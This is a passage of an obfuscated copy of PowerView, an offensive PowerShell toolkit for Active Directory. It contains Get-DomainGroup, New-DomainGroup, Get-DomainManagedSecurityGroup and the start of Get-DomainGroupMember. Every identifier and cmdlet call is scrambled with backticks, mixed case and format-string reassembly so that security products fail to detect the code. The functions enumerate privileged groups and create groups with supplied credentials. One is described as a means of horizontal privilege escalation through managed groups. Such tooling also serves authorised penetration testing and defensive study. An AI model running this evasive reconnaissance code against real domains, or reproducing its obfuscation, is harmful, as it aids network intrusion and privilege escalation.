                    # cause the cache to calculate the token groups for the user/group
                    ${OBJEC`TDIRe`ct`OR`YEnt`RY}.RefreshCache('tokenGroups')

                    ${Ob`jEct`DIreCTOr`Ye`NTrY}.TokenGroups | &("{4}{1}{2}{0}{3}" -f '-','ac','h','Object','ForE') {
                        # convert the token group sid
                        ${G`ROu`pSiD} = (&("{0}{3}{1}{2}" -f 'New-','jec','t','Ob') ("{10}{3}{6}{7}{2}{8}{0}{9}{1}{4}{12}{11}{5}" -f'l.Securit','I','Pri','Securit','d','fier','y','.','ncipa','y','System.','i','ent')(${_},0)).Value

                        # ignore the built in groups
                        if (${GR`OUPS`ID} -notmatch '^S-1-5-32-.*') {
                            ${Sear`ChE`RA`RguMenTs}['Identity'] = ${gR`ouPs`ID}
                            ${s`EAr`CheR`ARguM`e`NtS}['Raw'] = ${f`AlSe}
                            if (${ol`DpRoPeR`TiES}) { ${sEA`RcheR`ARgumEN`Ts}['Properties'] = ${ol`DPROP`ertIeS} }
                            ${G`R`OUp} = &("{1}{2}{3}{0}" -f'ect','Get','-Doma','inObj') @SearcherArguments
                            if (${G`ROUp}) {
                                ${gR`O`Up}.PSObject.TypeNames.Insert(0, 'PowerView.Group')
                                ${G`R`OUp}
                            }
                        }
                    }
                }
            }
            else {
                ${idE`NtIT`Y`FiLTer} = ''
                ${Fi`LtER} = ''
                ${Id`EntiTy} | &("{0}{2}{1}" -f'W','-Object','here') {${_}} | &("{3}{1}{0}{2}"-f 'a','rE','ch-Object','Fo') {
                    ${iDen`T`It`Y`inSTanCE} = ${_}.Replace('(', '\28').Replace(')', '\29')
                    if (${iDEn`TiTYIn`STa`Nce} -match '^S-1-') {
                        ${i`DeN`TiT`y`FiLteR} += "(objectsid=$IdentityInstance)"
                    }
                    elseif (${I`d`ENtiTYInS`TAnCE} -match '^CN=') {
                        ${I`DenTiTy`FIlteR} += "(distinguishedname=$IdentityInstance)"
                        if ((-not ${psBound`pA`RAm`ETErS}['Domain']) -and (-not ${psBOu`N`d`pAramET`ErS}['SearchBase'])) {
                            # if a -Domain isn't explicitly set, extract the object domain out of the distinguishedname
                            #   and rebuild the domain searcher
                            ${idEn`Ti`TyDom`A`iN} = ${IDe`NtiTy`InS`TA`N`ce}.SubString(${ideN`Tit`y`INS`Tance}.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                            &("{0}{1}{3}{2}" -f'Write','-','se','Verbo') "[Get-DomainGroup] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
                            ${S`e`AR`C`HerAR`GumENts}['Domain'] = ${I`denT`itydOMAIN}
                            ${G`Rou`PSeARC`HER} = &("{3}{0}{2}{1}{4}"-f 'et-D','ain','om','G','Searcher') @SearcherArguments
                            if (-not ${G`R`OUp`sEarc`her}) {
                                &("{2}{0}{1}{3}" -f'te-War','nin','Wri','g') "[Get-DomainGroup] Unable to retrieve domain searcher for '$IdentityDomain'"
                            }
                        }
                    }
                    elseif (${ID`EnTITYin`St`ANcE} -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                        ${gU`i`dByt`ESTrIng} = (([Guid]${IdEn`T`IT`y`I`NSTAncE}).ToByteArray() | &("{1}{0}{2}" -f 'h','ForEac','-Object') { '\' + ${_}.ToString('X2') }) -join ''
                        ${I`dEn`T`It`YFILTeR} += "(objectguid=$GuidByteString)"
                    }
                    elseif (${I`DE`Nt`ITyInsTAnCe}.Contains('\')) {
                        ${Co`N`VER`TEdi`deNtIt`Y`instancE} = ${Id`e`NtITyi`N`STa`NCe}.Replace('\28', '(').Replace('\29', ')') | &("{0}{1}{2}{3}{4}" -f 'Co','nvert','-A','DNam','e') -OutputType ("{2}{1}{0}"-f'al','nonic','Ca')
                        if (${c`OnV`e`RTEDidEN`T`i`TYiNSTAnce}) {
                            ${Gr`Oupd`o`mAin} = ${CoNVert`ediDE`NtitY`i`NStA`Nce}.SubString(0, ${cONVErt`eDI`deNtI`Tyins`TancE}.IndexOf('/'))
                            ${G`R`oupNAme} = ${iDentiT`yiN`ST`AnCE}.Split('\')[1]
                            ${i`dE`Ntity`F`IlTER} += "(samAccountName=$GroupName)"
                            ${SearcheR`Ar`G`U`ments}['Domain'] = ${GR`ouPd`O`MaIn}
                            &("{1}{2}{0}"-f'e','Wri','te-Verbos') "[Get-DomainGroup] Extracted domain '$GroupDomain' from '$IdentityInstance'"
                            ${g`RoUP`SEarCHeR} = &("{0}{1}{3}{2}" -f'G','et-D','ainSearcher','om') @SearcherArguments
                        }
                    }
                    else {
                        ${i`D`ENt`ItYfiltER} += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance))"
                    }
                }

                if (${I`DEN`TiT`yFiL`TER} -and (${IDeNtI`Ty`F`il`TeR}.Trim() -ne '') ) {
                    ${fILt`er} += "(|$IdentityFilter)"
                }

                if (${ps`BOU`NDPa`RaME`TERS}['AdminCount']) {
                    &("{1}{2}{3}{0}"-f'se','Write-Ver','b','o') '[Get-DomainGroup] Searching for adminCount=1'
                    ${fil`T`Er} += '(admincount=1)'
                }
                if (${PS`BOuN`dpaRAM`ETErs}['GroupScope']) {
                    ${GR`Oup`sc`OpE`VaLuE} = ${p`SboUn`DP`ArAM`EtE`Rs}['GroupScope']
                    ${F`i`LtEr} = Switch (${G`Roup`SCoP`E`VAL`UE}) {
                        'DomainLocal'       { '(groupType:1.2.840.113556.1.4.803:=4)' }
                        'NotDomainLocal'    { '(!(groupType:1.2.840.113556.1.4.803:=4))' }
                        'Global'            { '(groupType:1.2.840.113556.1.4.803:=2)' }
                        'NotGlobal'         { '(!(groupType:1.2.840.113556.1.4.803:=2))' }
                        'Universal'         { '(groupType:1.2.840.113556.1.4.803:=8)' }
                        'NotUniversal'      { '(!(groupType:1.2.840.113556.1.4.803:=8))' }
                    }
                    &("{2}{4}{1}{0}{3}" -f 'Ver','e-','Wri','bose','t') "[Get-DomainGroup] Searching for group scope '$GroupScopeValue'"
                }
                if (${PSbO`UndP`A`RAMe`TE`RS}['GroupProperty']) {
                    ${Gr`OU`PpRo`PER`TYvALUE} = ${PSBOu`Nd`PA`Rame`TErS}['GroupProperty']
                    ${FiL`T`eR} = Switch (${GrOU`P`propERt`yVaLuE}) {
                        'Security'              { '(groupType:1.2.840.113556.1.4.803:=2147483648)' }
                        'Distribution'          { '(!(groupType:1.2.840.113556.1.4.803:=2147483648))' }
                        'CreatedBySystem'       { '(groupType:1.2.840.113556.1.4.803:=1)' }
                        'NotCreatedBySystem'    { '(!(groupType:1.2.840.113556.1.4.803:=1))' }
                    }
                    &("{3}{0}{4}{2}{1}"-f 'rite-','ose','erb','W','V') "[Get-DomainGroup] Searching for group property '$GroupPropertyValue'"
                }
                if (${P`sBOu`N`dpAraMEtERS}['LDAPFilter']) {
                    &("{1}{0}{2}" -f'e-Verbo','Writ','se') "[Get-DomainGroup] Using additional LDAP filter: $LDAPFilter"
                    ${f`iLt`eR} += "$LDAPFilter"
                }

                ${g`Rou`PSE`ARcHEr}.filter = "(&(objectCategory=group)$Filter)"
                &("{3}{1}{0}{2}{4}" -f'-V','rite','erb','W','ose') "[Get-DomainGroup] filter string: $($GroupSearcher.filter)"

                if (${PSBo`U`NDpaRa`meTers}['FindOne']) { ${r`EsuL`TS} = ${gRO`UpsEA`RCh`er}.FindOne() }
                else { ${rE`SUL`Ts} = ${G`Ro`UpS`eArch`er}.FindAll() }
                ${r`esuLTS} | &("{0}{1}{2}" -f 'Whe','re-O','bject') {${_}} | &("{0}{2}{1}" -f'ForEach-','ct','Obje') {
                    if (${PSBouND`P`ARa`MET`ErS}['Raw']) {
                        # return raw result objects
                        ${gRO`Up} = ${_}
                    }
                    else {
                        ${gr`Oup} = &("{5}{2}{4}{3}{0}{1}" -f'pert','y','onvert-L','Pro','DAP','C') -Properties ${_}.Properties
                    }
                    ${G`R`Oup}.PSObject.TypeNames.Insert(0, 'PowerView.Group')
                    ${g`ROuP}
                }
                if (${Res`U`ltS}) {
                    try { ${R`ESults}.dispose() }
                    catch {
                        &("{4}{1}{0}{3}{2}"-f'-V','ite','rbose','e','Wr') "[Get-DomainGroup] Error disposing of the Results object"
                    }
                }
                ${GroUpse`A`RcH`eR}.dispose()
            }
        }
    }
}


function NEw-do`Ma`INGr`ouP {
<#
.SYNOPSIS

Creates a new domain group (assuming appropriate permissions) and returns the group object.

TODO: implement all properties that New-ADGroup implements (https://technet.microsoft.com/en-us/library/ee617253.aspx).

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-PrincipalContext  

.DESCRIPTION

First binds to the specified domain context using Get-PrincipalContext.
The bound domain context is then used to create a new
DirectoryServices.AccountManagement.GroupPrincipal with the specified
group properties.

.PARAMETER SamAccountName

Specifies the Security Account Manager (SAM) account name of the group to create.
Maximum of 256 characters. Mandatory.

.PARAMETER Name

Specifies the name of the group to create. If not provided, defaults to SamAccountName.

.PARAMETER DisplayName

Specifies the display name of the group to create. If not provided, defaults to SamAccountName.

.PARAMETER Description

Specifies the description of the group to create.

.PARAMETER Domain

Specifies the domain to use to search for user/group principals, defaults to the current domain.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

New-DomainGroup -SamAccountName TestGroup -Description 'This is a test group.'

Creates the 'TestGroup' group with the specified description.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
New-DomainGroup -SamAccountName TestGroup -Description 'This is a test group.' -Credential $Cred

Creates the 'TestGroup' group with the specified description using the specified alternate credentials.

.OUTPUTS

DirectoryServices.AccountManagement.GroupPrincipal
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('DirectoryServices.AccountManagement.GroupPrincipal')]
    Param(
        [Parameter(Mandatory = ${Tr`UE})]
        [ValidateLength(0, 256)]
        [String]
        ${S`AmA`cCoUNTna`ME},

        [ValidateNotNullOrEmpty()]
        [String]
        ${NA`mE},

        [ValidateNotNullOrEmpty()]
        [String]
        ${dI`s`PLay`NaME},

        [ValidateNotNullOrEmpty()]
        [String]
        ${dEs`criPT`IoN},

        [ValidateNotNullOrEmpty()]
        [String]
        ${do`mA`iN},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`R`e`DENTial} = [Management.Automation.PSCredential]::Empty
    )

    ${C`ON`TeXtargUM`E`N`Ts} = @{
        'Identity' = ${saMACc`oUN`TnamE}
    }
    if (${pSBoUNd`paramE`T`ers}['Domain']) { ${c`ONteX`Targ`UMen`Ts}['Domain'] = ${Do`m`AiN} }
    if (${p`SBo`U`NdPARaM`eTErs}['Credential']) { ${CoN`TE`XtArgUMEn`Ts}['Credential'] = ${C`R`eDeNTiAl} }
    ${c`ONtE`xt} = &("{4}{0}{2}{5}{1}{3}"-f'-Princi','e','palC','xt','Get','ont') @ContextArguments

    if (${co`NtExt}) {
        ${gR`o`UP} = &("{0}{3}{1}{2}"-f 'N','bjec','t','ew-O') -TypeName ("{16}{7}{17}{1}{15}{12}{14}{2}{8}{5}{6}{4}{10}{13}{0}{3}{11}{9}" -f 'ro','.','ySe','up','untMa','vices.','Acco','yste','r','rincipal','nagemen','P','irec','t.G','tor','D','S','m') -ArgumentList (${C`ON`Text}.Context)

        # set all the appropriate group parameters
        ${gR`o`UP}.SamAccountName = ${C`OnTeXt}.Identity

        if (${pSBOUndPA`Ra`me`T`eRS}['Name']) {
            ${gro`UP}.Name = ${na`Me}
        }
        else {
            ${G`Roup}.Name = ${cO`Nt`ext}.Identity
        }
        if (${ps`BoUNdpARAm`ETE`Rs}['DisplayName']) {
            ${Gr`OuP}.DisplayName = ${d`isp`l`AynAmE}
        }
        else {
            ${g`RO`UP}.DisplayName = ${Co`NT`exT}.Identity
        }

        if (${Ps`BOu`NdParAm`Ete`Rs}['Description']) {
            ${GrO`UP}.Description = ${deS`crI`PtION}
        }

        &("{0}{1}{2}"-f 'Write-','Ver','bose') "[New-DomainGroup] Attempting to create group '$SamAccountName'"
        try {
            ${N`ULl} = ${g`Ro`UP}.Save()
            &("{3}{0}{2}{1}"-f'te','e','-Verbos','Wri') "[New-DomainGroup] Group '$SamAccountName' successfully created"
            ${G`R`Oup}
        }
        catch {
            &("{0}{2}{1}"-f'Write-Warn','ng','i') "[New-DomainGroup] Error creating group '$SamAccountName' : $_"
        }
    }
}


function GE`T`-dO`m`A`inmAnAgE`D`SECuri`Ty`gROuP {
<#
.SYNOPSIS

Returns all security groups in the current (or target) domain that have a manager set.

Author: Stuart Morgan (@ukstufus) <stuart.morgan@mwrinfosecurity.com>, Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainObject, Get-DomainGroup, Get-DomainObjectAcl  

.DESCRIPTION

Authority to manipulate the group membership of AD security groups and distribution groups
can be delegated to non-administrators by setting the 'managedBy' attribute. This is typically
used to delegate management authority to distribution groups, but Windows supports security groups
being managed in the same way.

This function searches for AD groups which have a group manager set, and determines whether that
user can manipulate group membership. This could be a useful method of horizontal privilege
escalation, especially if the manager can manipulate the membership of a privileged group.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER SearchBase

The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainManagedSecurityGroup | Export-PowerViewCSV -NoTypeInformation group-managers.csv

Store a list of all security groups with managers in group-managers.csv

.OUTPUTS

PowerView.ManagedSecurityGroup

A custom PSObject describing the managed security group.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ManagedSecurityGroup')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = ${t`Rue}, ValueFromPipelineByPropertyName = ${tR`UE})]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        ${DoMa`in},

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        ${SeAr`CH`BAse},

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${SER`VER},

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        ${S`EaR`Ch`SCOPE} = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        ${r`eSULT`pAG`ESiZE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${se`RvErti`M`ELiMiT},

        [Switch]
        ${T`Om`Bst`one},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cr`ed`enTIal} = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        ${SEARch`eR`A`Rgum`ENTS} = @{
            'LDAPFilter' = '(&(managedBy=*)(groupType:1.2.840.113556.1.4.803:=2147483648))'
            'Properties' = 'distinguishedName,managedBy,samaccounttype,samaccountname'
        }
        if (${PsboU`ND`P`ARAM`eTe`RS}['SearchBase']) { ${se`ArCHEr`A`RGu`menTS}['SearchBase'] = ${sEa`R`c`hBAse} }
        if (${ps`BOuNd`PaR`AMET`Ers}['Server']) { ${Searc`He`R`A`RGu`mEnts}['Server'] = ${SE`RV`er} }
        if (${Psbo`UNDp`ArAm`eTeRS}['SearchScope']) { ${SeAr`C`H`ERarg`UmEnts}['SearchScope'] = ${S`earc`HSCOPe} }
        if (${Ps`BOU`NDpAr`AM`eters}['ResultPageSize']) { ${SEArcH`er`ARG`UM`ENTs}['ResultPageSize'] = ${rEsU`lTpA`g`eSiZE} }
        if (${PSBO`U`ND`pArAMetErs}['ServerTimeLimit']) { ${Se`ArC`he`RaRgUMenTS}['ServerTimeLimit'] = ${sER`VErti`MEL`im`it} }
        if (${PsBOU`NdP`ArA`m`eT`ers}['SecurityMasks']) { ${sEArcH`erAr`gUmEN`Ts}['SecurityMasks'] = ${SeCuRIT`ymas`KS} }
        if (${pSboUN`Dp`ArA`me`T`ErS}['Tombstone']) { ${Sea`RC`herArgUm`eN`TS}['Tombstone'] = ${Tombs`TO`Ne} }
        if (${psBOund`p`A`RAmet`Ers}['Credential']) { ${sEaRChE`Ra`RG`U`mEnTS}['Credential'] = ${c`ReDeN`TIAl} }
    }

    PROCESS {
        if (${Ps`BOuNDpa`RAm`EtE`Rs}['Domain']) {
            ${SeaRcHERa`Rg`UMEn`Ts}['Domain'] = ${D`omA`in}
            ${t`Ar`gETdO`main} = ${dO`ma`In}
        }
        else {
            ${Ta`R`geTDOmAiN} = ${E`NV:uSERdn`sd`omaiN}
        }

        # go through the list of security groups on the domain and identify those who have a manager
        &("{0}{2}{1}{3}" -f'Get-Do','ai','m','nGroup') @SearcherArguments | &("{3}{4}{1}{2}{0}" -f 'Object','c','h-','ForE','a') {
            ${se`ARcH`eRa`RGU`M`EnTS}['Properties'] = 'distinguishedname,name,samaccounttype,samaccountname,objectsid'
            ${searcH`eRA`RGum`e`Nts}['Identity'] = ${_}.managedBy
            ${nU`ll} = ${sEAR`cHeRArGu`mEn`Ts}.Remove('LDAPFilter')

            # $SearcherArguments
            # retrieve the object that the managedBy DN refers to
            ${Gr`OUPmaN`AGeR} = &("{2}{3}{0}{1}"-f 'omainOb','ject','G','et-D') @SearcherArguments
            # Write-Host "GroupManager: $GroupManager"
            ${m`ANa`gEdgR`oUP} = &("{2}{0}{1}" -f'e','ct','New-Obj') ("{1}{0}"-f 'ct','PSObje')
            ${mA`N`AgedgR`OUp} | &("{1}{2}{0}"-f'er','Add-M','emb') ("{1}{0}{2}"-f 'te','No','property') 'GroupName' ${_}.samaccountname
            ${MANagE`DGRO`Up} | &("{2}{1}{0}"-f 'Member','d-','Ad') ("{3}{1}{0}{2}"-f'oper','pr','ty','Note') 'GroupDistinguishedName' ${_}.distinguishedname
            ${ma`NA`G`edGrO`Up} | &("{2}{0}{1}"-f'embe','r','Add-M') ("{2}{1}{0}{3}"-f'rt','rope','Notep','y') 'ManagerName' ${GRo`UpMAnag`Er}.samaccountname
            ${MANa`g`E`dGRoUp} | &("{1}{2}{0}"-f'-Member','A','dd') ("{2}{0}{1}" -f't','eproperty','No') 'ManagerDistinguishedName' ${groupM`A`NAgeR}.distinguishedName

            # determine whether the manager is a user or a group
            if (${gR`o`UpMaNag`ER}.samaccounttype -eq 0x10000000) {
                ${manAg`Ed`gr`oup} | &("{2}{1}{0}" -f'd-Member','d','A') ("{2}{0}{1}{3}" -f 'tepr','o','No','perty') 'ManagerType' 'Group'
            }
            elseif (${G`RoupMANA`G`Er}.samaccounttype -eq 0x30000000) {
                ${mAn`AgEd`G`RoUP} | &("{3}{2}{0}{1}" -f'mb','er','-Me','Add') ("{0}{2}{3}{1}" -f 'Notep','perty','r','o') 'ManagerType' 'User'
            }

            ${ACL`AR`GUments} = @{
                'Identity' = ${_}.distinguishedname
                'RightsFilter' = 'WriteMembers'
            }
            if (${pS`B`OUNDp`ARAm`et`ErS}['Server']) { ${ACl`ARgu`meNTs}['Server'] = ${sER`VEr} }
            if (${PsB`ou`NDpA`RAME`TeRS}['SearchScope']) { ${ACL`Ar`GUM`ENTS}['SearchScope'] = ${SE`A`RCh`sCoPe} }
            if (${psbo`Un`dPAr`AmeTERs}['ResultPageSize']) { ${a`clarG`Um`ENts}['ResultPageSize'] = ${reS`ULTPA`GEs`i`ze} }
            if (${ps`B`o`UndPAr`AME`TErS}['ServerTimeLimit']) { ${aclARg`UmEN`TS}['ServerTimeLimit'] = ${SErvE`Rt`I`meLi`m`it} }
            if (${PS`B`oUNDpA`R`AMeters}['Tombstone']) { ${AcLa`Rgum`ENTs}['Tombstone'] = ${tO`mBS`TOnE} }
            if (${psbo`U`NdPAR`Am`EtE`Rs}['Credential']) { ${acl`ARG`UmEnts}['Credential'] = ${c`Red`e`Ntial} }

            # # TODO: correct!
            # # find the ACLs that relate to the ability to write to the group
            # $xacl = Get-DomainObjectAcl @ACLArguments -Verbose
            # # $ACLArguments
            # # double-check that the manager
            # if ($xacl.ObjectType -eq 'bf9679c0-0de6-11d0-a285-00aa003049e2' -and $xacl.AceType -eq 'AccessAllowed' -and ($xacl.ObjectSid -eq $GroupManager.objectsid)) {
            #     $ManagedGroup | Add-Member Noteproperty 'ManagerCanWrite' $True
            # }
            # else {
            #     $ManagedGroup | Add-Member Noteproperty 'ManagerCanWrite' $False
            # }

            ${m`A`NAgeDgroUp} | &("{1}{2}{0}"-f'Member','Ad','d-') ("{0}{2}{3}{1}"-f'Notepr','rty','o','pe') 'ManagerCanWrite' 'UNKNOWN'

            ${M`ANAG`EdGrouP}.PSObject.TypeNames.Insert(0, 'PowerView.ManagedSecurityGroup')
            ${MaNaGED`GR`O`UP}
        }
    }
}


function gET-DoM`AIn`G`Ro`Upme`MbEr {
<#
.SYNOPSIS

Return the members of a specific domain group.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainSearcher, Get-DomainGroup, Get-DomainGroupMember, Convert-ADName, Get-DomainObject, ConvertFrom-SID  

.DESCRIPTION

Builds a directory searcher object using Get-DomainSearcher, builds a custom
LDAP filter based on targeting/filter parameters, and searches for the specified
group matching the criteria. Each result is then rebound and the full user
or group object is returned.

.PARAMETER Identity

A SamAccountName (e.g. Group1), DistinguishedName (e.g. CN=group1,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1114), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d202)
specifying the group to query for. Wildcards accepted.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER Recurse

Switch. If the group member is a group, recursively try to query its members as well.

.PARAMETER RecurseUsingMatchingRule

Switch. Use LDAP_MATCHING_RULE_IN_CHAIN in the LDAP search query to recurse.
Much faster than manual recursion, but doesn't reveal cross-domain groups,
and only returns user accounts (no nested group objects themselves).

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER SearchBase

The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER SecurityMasks

Specifies an option for examining security information of a directory object.
One of 'Dacl', 'Group', 'None', 'Owner', 'Sacl'.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainGroupMember "Desktop Admins"

GroupDomain             : testlab.local
GroupName               : Desktop Admins
GroupDistinguishedName  : CN=Desktop Admins,CN=Users,DC=testlab,DC=local
MemberDomain            : testlab.local
MemberName              : Testing Group
MemberDistinguishedName : CN=Testing Group,CN=Users,DC=testlab,DC=local
MemberObjectClass       : group
MemberSID               : S-1-5-21-890171859-3433809279-3366196753-1129

GroupDomain             : testlab.local
GroupName               : Desktop Admins
GroupDistinguishedName  : CN=Desktop Admins,CN=Users,DC=testlab,DC=local
MemberDomain            : testlab.local
MemberName              : arobbins.a
MemberDistinguishedName : CN=Andy Robbins (admin),CN=Users,DC=testlab,DC=local
MemberObjectClass       : user
MemberSID               : S-1-5-21-890171859-3433809279-3366196753-1112

.EXAMPLE

'Desktop Admins' | Get-DomainGroupMember -Recurse

GroupDomain             : testlab.local
GroupName               : Desktop Admins
GroupDistinguishedName  : CN=Desktop Admins,CN=Users,DC=testlab,DC=local
MemberDomain            : testlab.local
MemberName              : Testing Group
MemberDistinguishedName : CN=Testing Group,CN=Users,DC=testlab,DC=local
MemberObjectClass       : group
MemberSID               : S-1-5-21-890171859-3433809279-3366196753-1129

GroupDomain             : testlab.local
GroupName               : Testing Group
GroupDistinguishedName  : CN=Testing Group,CN=Users,DC=testlab,DC=local
MemberDomain            : testlab.local
MemberName              : harmj0y
MemberDistinguishedName : CN=harmj0y,CN=Users,DC=testlab,DC=local
MemberObjectClass       : user
MemberSID               : S-1-5-21-890171859-3433809279-3366196753-1108

GroupDomain             : testlab.local
GroupName               : Desktop Admins
GroupDistinguishedName  : CN=Desktop Admins,CN=Users,DC=testlab,DC=local
MemberDomain            : testlab.local
MemberName              : arobbins.a
MemberDistinguishedName : CN=Andy Robbins (admin),CN=Users,DC=testlab,DC=local
MemberObjectClass       : user
MemberSID               : S-1-5-21-890171859-3433809279-3366196753-1112

.EXAMPLE

Get-DomainGroupMember -Domain testlab.local -Identity 'Desktop Admins' -RecurseUingMatchingRule

GroupDomain             : testlab.local
GroupName               : Desktop Admins
GroupDistinguishedName  : CN=Desktop Admins,CN=Users,DC=testlab,DC=local
MemberDomain            : testlab.local
MemberName              : harmj0y
MemberDistinguishedName : CN=harmj0y,CN=Users,DC=testlab,DC=local
MemberObjectClass       : user
MemberSID               : S-1-5-21-890171859-3433809279-3366196753-1108

GroupDomain             : testlab.local
GroupName               : Desktop Admins
GroupDistinguishedName  : CN=Desktop Admins,CN=Users,DC=testlab,DC=local
MemberDomain            : testlab.local
MemberName              : arobbins.a
MemberDistinguishedName : CN=Andy Robbins (admin),CN=Users,DC=testlab,DC=local
MemberObjectClass       : user
MemberSID               : S-1-5-21-890171859-3433809279-3366196753-1112

.EXAMPLE

Get-DomainGroup *admin* -Properties samaccountname | Get-DomainGroupMember

.EXAMPLE

'CN=Enterprise Admins,CN=Users,DC=testlab,DC=local', 'Domain Admins' | Get-DomainGroupMember

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainGroupMember -Credential $Cred -Identity 'Domain Admins'

.EXAMPLE

Get-Domain | Select-Object -Expand name
testlab.local

'dev\domain admins' | Get-DomainGroupMember -Verbose
VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local
VERBOSE: [Get-DomainGroupMember] Extracted domain 'dev.testlab.local' from 'dev\domain admins'
VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=dev,DC=testlab,DC=local
VERBOSE: [Get-DomainGroupMember] Get-DomainGroupMember filter string: (&(objectCategory=group)(|(samAccountName=domain admins)))
VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=dev,DC=testlab,DC=local
VERBOSE: [Get-DomainObject] Get-DomainObject filter string: (&(|(distinguishedname=CN=user1,CN=Users,DC=dev,DC=testlab,DC=local)))

GroupDomain             : dev.testlab.local
GroupName               : Domain Admins
GroupDistinguishedName  : CN=Domain Admins,CN=Users,DC=dev,DC=testlab,DC=local
MemberDomain            : dev.testlab.local
MemberName              : user1
MemberDistinguishedName : CN=user1,CN=Users,DC=dev,DC=testlab,DC=local
MemberObjectClass       : user
MemberSID               : S-1-5-21-339048670-1233568108-4141518690-201108

VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=dev,DC=testlab,DC=local
VERBOSE: [Get-DomainObject] Get-DomainObject filter string: (&(|(distinguishedname=CN=Administrator,CN=Users,DC=dev,DC=testlab,DC=local)))
GroupDomain             : dev.testlab.local
GroupName               : Domain Admins
GroupDistinguishedName  : CN=Domain Admins,CN=Users,DC=dev,DC=testlab,DC=local
MemberDomain            : dev.testlab.local
MemberName              : Administrator
MemberDistinguishedName : CN=Administrator,CN=Users,DC=dev,DC=testlab,DC=local
MemberObjectClass       : user
MemberSID               : S-1-5-21-339048670-1233568108-4141518690-500

.OUTPUTS

PowerView.GroupMember

Custom PSObject with translated group member property fields.

.LINK

http://www.powershellmagazine.com/2013/05/23/pstip-retrieve-group-membership-of-an-active-directory-group-recursively/
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.GroupMember')]
    [CmdletBinding(DefaultParameterSetName = 'None')]
    Param(
        [Parameter(Position = 0, Mandatory = ${tR`Ue}, ValueFromPipeline = ${T`RuE}, ValueFromPipelineByPropertyName = ${T`Rue})]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        ${IDE`NtI`TY},

        [ValidateNotNullOrEmpty()]
        [String]
        ${DO`ma`IN},

        [Parameter(ParameterSetName = 'ManualRecurse')]
        [Switch]
        ${rE`cU`RsE},

        [Parameter(ParameterSetName = 'RecurseUsingMatchingRule')]
        [Switch]
        ${R`eCURs`EUsI`Ngm`ATcHiNg`Ru`lE},

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        ${L`dAPFI`lt`eR},

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        ${sEa`R`ChBa`Se},

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${SE`RVeR},

